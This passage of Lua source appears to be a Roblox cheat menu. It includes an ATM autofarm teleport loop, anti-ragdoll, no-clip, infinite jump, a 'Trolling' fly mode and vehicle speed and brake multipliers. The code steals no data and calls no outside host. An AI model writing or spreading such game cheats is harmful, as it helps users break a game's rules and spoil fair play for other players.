                -- Tween directly to the final position
                local finalTweenGoal = {CFrame = targetCFrame}
                local finalTween = TweenService:Create(humanoidRootPart, tweenInfo, finalTweenGoal)
                finalTween:Play()
                finalTween.Completed:Wait()

                if stopAtNext then
                    stopAtNext = false
                    return  -- Exit the coroutine to stop the autofarm
                end
            end

            -- Move to the next ATM in the list
            currentIndex = (currentIndex % #destinations) + 1
        end
    end)()
end

-- Callback function for the toggle
local function onToggleActivated(isOn)
    print("Toggle State: " .. tostring(isOn))
    
    if isOn then
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        
        -- Reset state
        isActive = true
        stopAtNext = false
        currentIndex = 1
        
        -- Start the teleportation coroutine
        teleportWithTween(character, atmCFrames, tweenTime)
    else
        -- Stop the autofarm at the next destination
        stopAtNext = true
    end
end

ATMAutoFarmSection:addToggle({
    title = "Autofarm",    -- Title of the toggle
    default = false,      -- Default value (off)
    callback = onToggleActivated  -- Function to call when the toggle state changes
})
















local ExtraPage = UI:addPage({
    title = "Extra",  -- Title of the page
    icon = 1234567890     -- Asset ID for the page icon (optional)
})



local AntiSection = ExtraPage:addSection({
    title = "Anti" -- Title of the section
})


-- Variable to keep track of the Anti Ragdoll state
local antiRagdollEnabled = false
local monitoringCoroutine

-- Function to start monitoring ragdolling
local function startAntiRagdoll()
    local player = game.Players.LocalPlayer

    -- Ensure player and character exist
    if not player or not player.Character or not player.Character:FindFirstChildOfClass("Humanoid") then
        warn("Player or Humanoid not found")
        return
    end

    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

    -- Function to continuously monitor and prevent ragdolling
    local function monitorRagdoll()
        while antiRagdollEnabled do
            if humanoid:GetState() == Enum.HumanoidStateType.Physics then
                -- Immediately reset to a standing state to prevent ragdoll
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
            end

            -- Short wait to prevent performance issues
            wait(0.1)
        end
    end

    -- Start monitoring
    monitoringCoroutine = coroutine.create(monitorRagdoll)
    coroutine.resume(monitoringCoroutine)
end

-- Function to stop monitoring ragdolling
local function stopAntiRagdoll()
    antiRagdollEnabled = false
    if monitoringCoroutine then
        -- Ensure that the monitoring coroutine stops
        coroutine.close(monitoringCoroutine)
    end
end

AntiSection:addToggle({
    title = "Anti Ragdoll",  -- Title of the toggle
    default = false,        -- Default value (off)
    callback = function(value)
        if value then
            antiRagdollEnabled = true
            startAntiRagdoll()
        else
            stopAntiRagdoll()
        end
    end    
})







local InfSection = ExtraPage:addSection({
    title = "Inf" -- Title of the section
})












local MovementSection = ExtraPage:addSection({
    title = "Movement" -- Title of the section
})


MovementSection:addToggle({
    title = "No clip",     -- Title of the toggle
    default = false,       -- Default value (off)
    callback = function(value)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local runService = game:GetService("RunService")

        -- Track the no-clip state
        local noClip = value

        local function setCollisionEnabled(enabled)
            -- Toggle collision for all parts in the character
            for _, part in ipairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.CanCollide = enabled
                end
            end
        end

        local function updateNoClip()
            if noClip then
                setCollisionEnabled(false)
                print("No-clip mode enabled.")
            else
                setCollisionEnabled(true)
                print("No-clip mode disabled.")
            end
        end

        -- Update no-clip mode based on the toggle state
        updateNoClip()

        -- Ensure character moves through all objects while no-clip is enabled
        runService.RenderStepped:Connect(function()
            if noClip then
                -- Set collision to false for all parts
                setCollisionEnabled(false)
            else
                -- Restore collision for all parts when no-clip is disabled
                setCollisionEnabled(true)
            end
        end)
    end    
})















MovementSection:addToggle({
    title = "Inf Jump",    -- Title of the toggle
    default = false,       -- Default value (off)
    callback = function(value)
        -- Set the global infinite jump state based on the toggle
        _G.infinjump = value

        local Player = game:GetService("Players").LocalPlayer
        local Mouse = Player:GetMouse()

        -- Function to handle jumping
        local function onKeyPress(k)
            if _G.infinjump then
                if k:byte() == 32 then
                    local Humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
                    if Humanoid then
                        Humanoid:ChangeState("Jumping")
                        wait(0.1)
                        Humanoid:ChangeState("Seated")
                    end
                end
            end
        end

        -- Function to toggle infinite jump mode
        local function onToggleKeyPress(k)
            k = k:lower()
            if k == "f" then
                _G.infinjump = not _G.infinjump
            end
        end

        -- Connect key press events
        Mouse.KeyDown:Connect(onKeyPress)
        Mouse.KeyDown:Connect(onToggleKeyPress)
    end    
})










local TrollingPage = UI:addPage({
    title = "Trolling",  -- Title of the page
    icon = 1234567890     -- Asset ID for the page icon (optional)
})





local FirstPersonSection = TrollingPage:addSection({
    title = "First Person Fly" -- Title of the section
})






local userInputService = game:GetService("UserInputService")
local runService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local camera = game.Workspace.CurrentCamera

-- Define variables
local flying = false
local cameraSpeed = 2
local rotating = false
local flyingEnabled = false
local toggleKey = Enum.KeyCode.X
local flySpeed = 50
local mouse = player:GetMouse()

-- Function to toggle flying mode
local function toggleFlyMode(value)
    flyingEnabled = value
    if not flyingEnabled then
        flying = false
        camera.CameraType = Enum.CameraType.Custom
        camera.CameraSubject = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
        
        -- Disable Shift Lock
        userInputService.ModalEnabled = false
        
        if player.Character then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                humanoidRootPart.Anchored = false
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                        part.Transparency = 0
                    end
                end
            end
        end
    end
end

-- Function to start or stop flying
local function toggleFly()
    if flyingEnabled then
        flying = not flying
        if flying then
            if player.Character then
                local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    humanoidRootPart.Anchored = true
                    for _, part in pairs(player.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                            part.Transparency = 1
                        end
                    end
                end
            end

            -- Lock the camera in the center
            camera.CameraType = Enum.CameraType.Scriptable
            userInputService.ModalEnabled = true
            
        else
            camera.CameraType = Enum.CameraType.Custom
            camera.CameraSubject = player.Character and player.Character:FindFirstChildOfClass("Humanoid")

            if player.Character then
                local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    humanoidRootPart.Anchored = false
                    for _, part in pairs(player.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = true
                            part.Transparency = 0
                        end
                    end
                end
            end

            userInputService.ModalEnabled = false
        end
    end
end

-- Update camera position and rotation while flying
local function onRenderStepped()
    if flying then
        local moveDirection = Vector3.new()

        -- Forward and backward movement
        if userInputService:IsKeyDown(Enum.KeyCode.W) then
            moveDirection = moveDirection + camera.CFrame.LookVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.S) then
            moveDirection = moveDirection - camera.CFrame.LookVector
        end

        -- Left and right movement
        if userInputService:IsKeyDown(Enum.KeyCode.A) then
            moveDirection = moveDirection - camera.CFrame.RightVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.D) then
            moveDirection = moveDirection + camera.CFrame.RightVector
        end

        -- Up and down movement
        if userInputService:IsKeyDown(Enum.KeyCode.E) then
            moveDirection = moveDirection + Vector3.new(0, 1, 0)
        end
        if userInputService:IsKeyDown(Enum.KeyCode.Q) then
            moveDirection = moveDirection + Vector3.new(0, -1, 0)
        end

        -- Normalize moveDirection to avoid faster diagonal movement
        if moveDirection.Magnitude > 0 then
            moveDirection = moveDirection.Unit
        end

        -- Update the camera's position
        local movement = moveDirection * flySpeed
        camera.CFrame = camera.CFrame + movement

        -- Mouse-controlled rotation
        local mouseDelta = userInputService:GetMouseDelta()
        local yaw = CFrame.Angles(0, -math.rad(mouseDelta.X * 0.1), 0)
        local pitch = CFrame.Angles(-math.rad(mouseDelta.Y * 0.1), 0, 0)

        -- Apply rotation to the camera
        camera.CFrame = camera.CFrame * yaw * pitch
    end
end

-- Function to handle mouse button events
local function onInputBegan(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        rotating = true
    end
end

local function onInputEnded(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        rotating = false
    end
end

-- Connect to input and render events
userInputService.InputBegan:Connect(onInputBegan)
userInputService.InputEnded:Connect(onInputEnded)
runService.RenderStepped:Connect(onRenderStepped)

-- Handle the toggle functionality
FirstPersonSection:addToggle({
    title = "Enable First Person Fly",
    default = false,
    callback = toggleFlyMode
})

-- Handle the keybind functionality
FirstPersonSection:addKeybind({ 
    title = "Fly Keybind",
    key = toggleKey,
    callback = function()
        toggleFly()
    end,
    changedCallback = function(key)
        toggleKey = key
        print("Changed Keybind to", key)
    end
})

-- Handle the speed slider functionality
FirstPersonSection:addSlider({
    title = "Adjust Fly Speed",
    default = flySpeed,
    min = 1,
    max = 100,
    callback = function(value)
        flySpeed = value
        cameraSpeed = flySpeed
        print("Fly Speed:", value)
    end
})

-- Ensure character model is updated when respawned
player.CharacterAdded:Connect(function(character)
    character.PrimaryPart = character:WaitForChild("HumanoidRootPart")
end)

































local VehiclePage = UI:addPage({
    title = "Vehicle",  -- Title of the page
    icon = 1234567890     -- Asset ID for the page icon (optional)
})



local AccelerationSection = VehiclePage:addSection({
    title = "Acceleration"-- Title of the section
})






local velocityMult = 0.025
local accelerationEnabled = false


AccelerationSection:addToggle({
    title = "Acceleration Enabled",  -- Title of the toggle
    default = accelerationEnabled,   -- Initial value of the toggle
    callback = function(value)
        accelerationEnabled = value  -- Update accelerationEnabled with the toggle's value
    end    
})


AccelerationSection:addSlider({
    title = "Speed Multiplier",    -- Title of the slider
    min = 0,                      -- Minimum value
    max = 50,                     -- Maximum value
    default = 25,                 -- Default value
    color = Color3.fromRGB(255, 255, 255),  -- Slider color
    increment = 1,                -- Increment step
    valueName = "Multiplier",     -- Displayed value name
    callback = function(value)
        velocityMult = value / 1000  -- Update velocityMult
    end    
})


RunService.Stepped:Connect(function()
    if accelerationEnabled then
        local Character = LocalPlayer.Character
        if Character and typeof(Character) == "Instance" then
            local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
            if Humanoid and typeof(Humanoid) == "Instance" then
                local SeatPart = Humanoid.SeatPart
                if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
                    SeatPart.AssemblyLinearVelocity *= Vector3.new(1 + velocityMult, 1, 1 + velocityMult)
                end
            end
        end
    end
end)

-- Deceleration Section
local velocityMult2 = 150e-3
local quickBrakeEnabled = false
local braking = false

local DecelerationSection = VehiclePage:addSection({
    title = "Deceleration" -- Title of the section
})


DecelerationSection:addToggle({
    title = "Instant Break Enable",  -- Title of the toggle
    default = quickBrakeEnabled,     -- Initial value of the toggle
    callback = function(value)
        quickBrakeEnabled = value  -- Update quickBrakeEnabled with the toggle's value
    end    
})


DecelerationSection:addSlider({
    title = "Instant Brake",       -- Title of the slider
    min = 0,                      -- Minimum value
    max = 300,                    -- Maximum value
    default = velocityMult2 * 1e3, -- Default value, converted to match the old slider’s scale
    color = Color3.fromRGB(255, 255, 255),  -- Slider color
    increment = 1,                -- Increment step
    valueName = "Brake Force",    -- Displayed value name
    callback = function(value)
        velocityMult2 = value / 1000  -- Update velocityMult2 with the slider's value divided by 1000
    end    
})


-- Add a keybind to activate braking
local quickBrakeKeyCode = Enum.KeyCode.S
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == quickBrakeKeyCode then
        braking = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.KeyCode == quickBrakeKeyCode then
        braking = false
    end
end)

RunService.Stepped:Connect(function()
    if not quickBrakeEnabled then return end

    local Character = LocalPlayer.Character
    if Character and typeof(Character) == "Instance" then
        local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
        if Humanoid and typeof(Humanoid) == "Instance" then
            local SeatPart = Humanoid.SeatPart
            if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
                if braking then
                    SeatPart.AssemblyLinearVelocity *= Vector3.new(1 - velocityMult2, 1, 1 - velocityMult2)
                end
            end
        end
    end
end)

















local ThemePage = UI:addPage({
    title = "Settings", -- Title of the page
    icon = iconAssetId  -- Asset ID for the page icon (optional)
})

-- Section for the Color Theme Customization Page
local ColorsSection = ThemePage:addSection({
    title = "UI Settings"
})

-- Adding a color picker for each type of theme customizable
local Themes = {
    Background = Color3.fromRGB(24, 24, 24),
    Glow = Color3.fromRGB(0, 0, 0),
    Accent = Color3.fromRGB(10, 10, 10),
    LightContrast = Color3.fromRGB(20, 20, 20),
    DarkContrast = Color3.fromRGB(14, 14, 14),
    TextColor = Color3.fromRGB(255, 255, 255)
}

for theme, color in pairs(Themes) do
    ColorsSection:addColorPicker({
        title = theme,
        default = color,
        callback = function(color3)
            -- Assuming UI:setTheme is correct; adjust if necessary
            UI:setTheme(theme, color3)
        end
    })
end

-- Adding Credits Section to the Theme Page
local CreditsSection = ThemePage:addSection({
    title = "Credits" -- Title of the section
})

-- Adding a button to the Credits section
CreditsSection:addButton({
    title = "By Senzo & Rxined", -- Title of the button
    callback = function()
        print("Created by Senzo & Rxined")
    end
})

-- Finalizing the UI setup
UI:SelectPage({
    page = AimbotPage,
    toggle = true
})
